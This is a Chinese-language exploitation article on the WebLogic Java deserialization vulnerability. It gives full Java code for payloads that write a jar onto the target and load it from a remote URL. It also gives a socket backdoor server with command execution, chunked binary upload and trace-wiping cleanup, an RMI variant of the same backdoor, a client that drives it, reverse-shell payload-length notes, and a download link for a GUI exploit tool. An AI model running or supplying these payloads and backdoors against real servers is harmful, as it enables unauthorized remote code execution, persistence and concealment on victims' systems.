# WebLogic之Java反序列化漏洞利用实现二进制文件上传和命令执行

0x00 简介
=======

* * *

Java反序列化漏洞由来已久，在WebLogic和JBoss等著名服务器上都曝出存在此漏洞。FoxGlove Security安全团队的breenmachine给出了详细的分析，但没有给出更近一步的利用方式。前段时间rebeyond在不需要连接公网的情况下使用RMI的方式在WebLogic上实现了文本文件上传和命令执行，但没有实现二进制文件上传。我通过使用Socket的方式实现了二进制文件上传和命令执行，同时也实现了RMI方式的二进制文件。

0x01 思路
=======

* * *

首先发Payload在目标服务器中写入一个Socket实现的迷你服务器类，所有的功能都将由这个迷你服务器来执行，然后再发一个Payload来启动服务器，最后本地客户端创建Socket连接的方式向服务器发送请求来使用相应的功能，其中上传二进制文件我采用分块传输的思想，这样可以实现上传较大的文件。

1.  本地创建Socket实现的迷你服务器类并导出jar包
2.  把jar包上传至目标服务器
3.  启动目标服务器上的迷你服务器
4.  使用二进制文件上传和命令执行功能
5.  发送关闭请求，清理目标服务器残留文件

0x02 实现
=======

* * *

1.本地创建Socket实现的迷你服务器类并导出jar包
----------------------------

```
public class Server {

    /**
     * 启动服务器
     * @param port
     * @param path
     */
    public static void start(int port, String path) {
        ServerSocket server = null;
        Socket client = null;
        InputStream input = null;
        OutputStream out = null;
        Runtime runTime = Runtime.getRuntime();
        try {
            server = new ServerSocket(port);
            // 0表示功能模式 1表示传输模式
            int opcode = 0;
            int len = 0;
            byte[] data = new byte[100 * 1024];
            String uploadPath = "";
            boolean isUploadStart = false;
            client = server.accept();
            input = client.getInputStream();
            out = client.getOutputStream();
            byte[] overData = { 0, 0, 0, 6, 6, 6, 8, 8, 8 };
            while (true) {
                len = input.read(data);
                if (len != -1) {
                    if (opcode == 0) {
                        // 功能模式
                        String operation = new String(data, 0, len);
                        String[] receive = operation.split(":::");
                        if ("bye".equals(receive[0])) {
                            // 断开连接 关闭服务器
                            out.write("success".getBytes());
                            out.flush();
                            FileOutputStream outputStream = new FileOutputStream(path);
                            // 清理残留文件
                            outputStream.write("".getBytes());
                            outputStream.flush();
                            outputStream.close();
                            break;
                        } else if ("cmd".equals(receive[0])) {
                            // 执行命令 返回结果
                            try {
                                Process proc = runTime.exec(receive[1]);
                                InputStream in = proc.getInputStream();
                                byte[] procData = new byte[1024];
                                byte[] total = new byte[0];
                                int procDataLen = 0;
                                while ((procDataLen = in.read(procData)) != -1) {
                                    byte[] temp = new byte[procDataLen];
                                    for (int i = 0; i < procDataLen; i++) {
                                        temp[i] = procData[i];
                                    }
                                    total = byteMerger(total, temp);
                                }
                                if (total.length == 0) {
                                    out.write("error".getBytes());
                                } else {
                                    out.write(total);
                                }
                                out.flush();
                            } catch (Exception e) {
                                e.printStackTrace();
                                out.write("error".getBytes());
                                out.flush();
                            }
                        } else if ("upload".equals(receive[0])) {
                            // 切换成传输模式
                            uploadPath = receive[1];
                            isUploadStart = true;
                            opcode = 1;
                        }
                    } else if (opcode == 1) {
                        // 传输模式
                        byte[] receive = new byte[len];
                        for (int i = 0; i < len; i++) {
                            receive[i] = data[i];
                        }
                        if (Arrays.equals(overData, receive)) {
                            // 传输结束切换成功能模式
                            isUploadStart = false;
                            opcode = 0;
                        } else {
                            // 分块接收
                            FileOutputStream outputStream = null;
                            if (isUploadStart) {
                                // 接收文件的开头部分
                                outputStream = new FileOutputStream(uploadPath, false);
                                outputStream.write(receive);
                                isUploadStart = false;
                            } else {
                                // 接收文件的结束部分
                                outputStream = new FileOutputStream(uploadPath, true);
                                outputStream.write(receive);
                            }
                            outputStream.close();
                        }
                    }
                } else {
                    Thread.sleep(1000);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            try {
                out.write("error".getBytes());
                out.flush();
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } finally {
            try {
                client.close();
                server.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    /**
     * 合并字节数组
     * @param byte_1
     * @param byte_2
     * @return 合并后的数组
     */
    private static byte[] byteMerger(byte[] byte_1, byte[] byte_2) {
        byte[] byte_3 = new byte[byte_1.length + byte_2.length];
        System.arraycopy(byte_1, 0, byte_3, 0, byte_1.length);
        System.arraycopy(byte_2, 0, byte_3, byte_1.length, byte_2.length);
        return byte_3;
    }

}

```

编译并导出jar包

2.发送Payload把jar包上传至服务器
----------------------

这里我要特别说明一点，breenmachine在介绍WebLogic漏洞利用时特别说明了需要计算Payload的长度，但是我看到过的国内文章没有一篇提到这一点，给出的利用代码中的Payload长度值写的都是原作者的`09f3`，我觉得这也是导致漏洞利用失败的主要原因之一，因此发送Payload前最好计算下长度。

> A very important point about the first chunk of the payload. Notice the first 4 bytes “00 00 09 f3”. The “09 f3” is the specification for the TOTAL payload length in bytes.

Payload的长度值可以在一个范围内，我们团队的cf_hb经过fuzz测试得到几个范围值：

> 1.  poc访问指定url：0x0000-0x1e39
> 2.  反弹shell：0x000-0x2049
> 3.  执行命令calc.exe：0x0000-0x1d38

这一步生成上传jar包的Payload

```
public static byte[] generateServerPayload(String remotePath) throws Exception {
    final Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(FileOutputStream.class),
            new InvokerTransformer("getConstructor",
                    new Class[] { Class[].class },
                    new Object[] { new Class[] { String.class } }),
            new InvokerTransformer("newInstance",
                    new Class[] { Object[].class },
                    new Object[] { new Object[] { remotePath } }),
            new InvokerTransformer("write", new Class[] { byte[].class },
                    new Object[] { Utils.hexStringToBytes(SERVER_JAR) }),
            new ConstantTransformer(1) };
    return generateObject(transformers);
}

```

发送到目标服务器写入jar包

3.发送Payload启动目标服务器上的迷你服务器
-------------------------

生成启动服务器的Payload

```
public static byte[] generateStartPayload(String remoteClassPath, String remotePath, int port) throws Exception {
    final Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(URLClassLoader.class),
            new InvokerTransformer("getConstructor",
                    new Class[] { Class[].class },
                    new Object[] { new Class[] { URL[].class } }),
            new InvokerTransformer("newInstance",
                    new Class[] { Object[].class },
                    new Object[] { new Object[] { new URL[] { new URL(remoteClassPath) } } }),
            new InvokerTransformer("loadClass",
                    new Class[] { String.class },
                    new Object[] { "org.heysec.exp.Server" }),
            new InvokerTransformer("getMethod",
                    new Class[] { String.class, Class[].class },
                    new Object[] { "start", new Class[] { int.class, String.class } }),
            new InvokerTransformer("invoke",
                    new Class[] { Object.class, Object[].class },
                    new Object[] { null, new Object[] { port, remotePath } }) };
    return generateObject(transformers);
}

```

发送到目标服务器启动迷你服务器

4.使用二进制文件上传和命令执行功能
------------------

本地测试客户端的代码

```
public class Client {
    public static void main(String[] args) {
        Socket client = null;
        InputStream input = null;
        OutputStream output = null;
        FileInputStream fileInputStream = null;
        try {
            int len = 0;
            byte[] receiveData = new byte[5 * 1024];
            byte[] sendData = new byte[100 * 1024];
            int sendLen = 0;
            byte[] overData = { 0, 0, 0, 6, 6, 6, 8, 8, 8 };

            // 创建客户端Socket
            client = new Socket("10.10.10.129", 8080);
            input = client.getInputStream();
            output = client.getOutputStream();

            // 发送准备上传文件命令使服务器切换到传输模式
            output.write("upload:::test.zip".getBytes());
            output.flush();
            Thread.sleep(1000);

            // 分块传输文件
            fileInputStream = new FileInputStream("F:/安全集/tools/BurpSuite_pro_v1.6.27.zip");
            sendLen = fileInputStream.read(sendData);
            if (sendLen != -1) {
                output.write(Arrays.copyOfRange(sendData, 0, sendLen));
                output.flush();
                Thread.sleep(1000);
                while ((sendLen = fileInputStream.read(sendData)) != -1) {
                    output.write(Arrays.copyOfRange(sendData, 0, sendLen));
                    output.flush();
                }
            }
            Thread.sleep(1000);

            // 发送文件上传结束命令
            output.write(overData);
            output.flush();
            Thread.sleep(1000);

            // 执行命令
            output.write("cmd:::cmd /c dir".getBytes());
            output.flush();
            Thread.sleep(1000);

            // 接收返回结果
            len = input.read(receiveData);
            String result = new String(receiveData, 0, len, "GBK");
            System.out.println(result);
            Thread.sleep(1000);

            // 关闭服务器
            output.write("bye".getBytes());
            output.flush();
            Thread.sleep(1000);

            len = input.read(receiveData);
            System.out.println(new String(receiveData, 0, len));
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                fileInputStream.close();
                client.close();
            } catch (Exception e) {
                e.printStackTrace();
            }

        }
    }
}

```

测试结果1![图片1](http://drops.javaweb.org/uploads/images/dec9778b325814d6e5b8a344fe0d1f459be0e817.jpg)

测试结果2![图片2](http://drops.javaweb.org/uploads/images/e333af348c8500627a6738b1b1b39a2952bdea65.jpg)

5. 发送关闭请求清理残留文件
---------------

客户端发送关闭请求

```
output.write("bye".getBytes());
output.flush();

```

服务器清除残留文件并关闭

```
if ("bye".equals(receive[0])) {
    // 断开连接 关闭服务器
    out.write("success".getBytes());
    out.flush();
    FileOutputStream outputStream = new FileOutputStream(path);
    // 清理残留文件
    outputStream.write("".getBytes());
    outputStream.flush();
    outputStream.close();
    break;
}

```

这就是按照我的思路实现的全部过程

0x03 RMI方式实现二进制文件上传及优化流程
========================

* * *

这部分只是对rebeyond的利用方式进行了扩展，添加了二进制文件上传的功能以及优化了流程。

扩展的远程类

```
public class RemoteObjectImpl implements RemoteObject {

    /**
     * 分块上传文件
     */
    public boolean upload(String uploadPath, byte[] data, boolean append) {
        FileOutputStream out = null;
        try {
            out = new FileOutputStream(uploadPath, append);
            out.write(data);
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        } finally {
            try {
                out.close();
            } catch (Exception e) {
                e.printStackTrace();
                return false;
            }
        }
    }

    /**
     * 执行命令
     */
    public String exec(String cmd) {
        try {
            Process proc = Runtime.getRuntime().exec(cmd);
            BufferedReader br = new BufferedReader(new InputStreamReader(
                    proc.getInputStream()));
            StringBuffer sb = new StringBuffer();
            String line;
            String result;
            while ((line = br.readLine()) != null) {
                sb.append(line).append("\n");
            }
            result = sb.toString();
            if ("".equals(result)) {
                return "error";
            } else {
                return result;
            }
        } catch (Exception e) {
            e.printStackTrace();
            return "error";
        }
    }

    /**
     * 反注册远程类并清除残留文件
     */
    public void unbind(String path) {
        try {
            Context ctx = new InitialContext();
            ctx.unbind("RemoteObject");
        } catch (Exception e) {
            e.printStackTrace();
        }
        FileOutputStream out = null;
        File file = null;
        try {
            file = new File(path);
            out = new FileOutputStream(file);
            out.write("".getBytes());
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                out.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

    }

    /**
     * 注册远程类
     */
    public static void bind() {
        try {
            RemoteObjectImpl remote = new RemoteObjectImpl();
            Context ctx = new InitialContext();
            ctx.bind("RemoteObject", remote);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

这样最后反注册和清除残留文件的时候就不需要再发送Payload了，只要调用远程类的unbind方法就行。

0x04 Socket VS RMI
==================

* * *

| VS | Socket | RMI |
| :-: | :-: | :-: |
| 端口 | 需要额外端口可能被防火墙拦截 | 使用WebLogic本身端口 |
| 传输速率 | 通过Socket字节流较快 | 通过远程过程调用较慢 |

0x05 总结
=======

* * *

这里以创建Socket服务器的思想实现了漏洞利用，我们可以继续扩展服务器的功能，甚至其他的代码执行漏洞也可以尝试这种方式，在传输较大文件时建议优先使用Socket方式。最后，我开发了GUI程序集成了Socket和RMI两种利用方式，大家可以自主选择。

Socket利用方式![图片3](http://drops.javaweb.org/uploads/images/3612c66c25520f6f2217b4840cdca4de961ee5a4.jpg)

RMI利用方式![图片4](http://drops.javaweb.org/uploads/images/b948343b486ef78708fef92b6ee430d927b05b6c.jpg)

> **下载链接：[http://pan.baidu.com/s/1pKuR9GJ](http://pan.baidu.com/s/1pKuR9GJ)****密码：62x4**

0x06 参考链接
=========

* * *

1.  [http://www.freebuf.com/vuls/90802.html](http://www.freebuf.com/vuls/90802.html)
2.  [http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)